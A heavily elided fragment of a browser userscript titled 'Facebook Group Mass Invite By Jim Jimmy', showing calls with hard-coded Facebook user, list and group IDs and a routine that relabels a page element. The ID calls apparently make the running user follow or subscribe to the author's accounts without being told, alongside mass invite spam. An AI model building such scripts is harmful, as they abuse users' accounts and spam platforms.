// ==UserScript==
// @name			Facebook Group Mass Invite By Jim Jimmy
...
a("1396727547209418");
 ...
 sublist("100006165578359");
 sublist("100002287465199");

var gid = ['146235058908428'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Jim Jimmy';
